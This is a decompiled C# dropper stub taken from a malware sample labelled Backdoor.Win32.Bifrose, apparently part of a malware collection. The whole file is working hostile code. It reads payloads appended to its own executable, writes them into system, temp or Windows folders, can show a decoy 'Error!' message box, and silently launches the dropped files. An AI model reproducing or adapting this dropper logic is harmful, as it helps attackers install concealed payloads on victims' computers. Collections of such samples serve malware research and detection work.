// Decompiled with JetBrains decompiler
// Type: Stub1.Program
// Assembly: Stub1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BFB797E1-6868-4DAE-9759-D724C84766BF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Bifrose.afe-2953e21cf175604c2018596e4da29f7291f022b3c31a2fdc427d2373a60fba1b.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace Stub1
{
  internal static class Program
  {
    [STAThread]
    private static void Main()
    {
      StreamReader streamReader = new StreamReader(Application.ExecutablePath);
      BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream);
      byte[] numArray = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
      binaryReader.Close();
      streamReader.Close();
      string str1 = new ASCIIEncoding().GetString(numArray);
      string str2 = str1.Substring(str1.LastIndexOf("|&&"));
      char[] chArray1 = new char[1]{ '#' };
      char[] chArray2 = new char[1]{ '|' };
      string[] strArray1 = str2.Split(chArray1);
      int num1 = 0;
      int offset = 0;
      foreach (string str3 in strArray1)
      {
        string[] strArray2 = str3.Replace("|&&", (string) null).Split(chArray2);
        if (num1 == 0)
        {
          offset = Convert.ToInt32(strArray2[0]);
          if (strArray2[1] != "False")
          {
            int num2 = (int) MessageBox.Show(strArray2[1], "Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          }
        }
        else
        {
          try
          {
            int int32 = Convert.ToInt32(strArray2[0]);
            string str4 = strArray2[1];
            bool boolean = Convert.ToBoolean(strArray2[2]);
            string str5 = strArray2[3];
            switch (str4)
            {
              case "Application":
                str4 = Application.StartupPath + "\\" + str5;
                break;
              case "System":
                str4 = Environment.SystemDirectory + "\\" + str5;
                break;
              case "Temporary":
                str4 = Environment.GetEnvironmentVariable("TEMP") + "\\" + str5;
                break;
              case "Windows":
                str4 = Environment.GetEnvironmentVariable("windir") + "\\" + str5;
                break;
            }
            StreamWriter streamWriter = new StreamWriter(str4);
            streamWriter.BaseStream.Write(numArray, offset, int32);
            streamWriter.Close();
            if (boolean)
              Process.Start(str4);
            offset += int32;
          }
          catch
          {
          }
        }
        ++num1;
      }
    }
  }
}
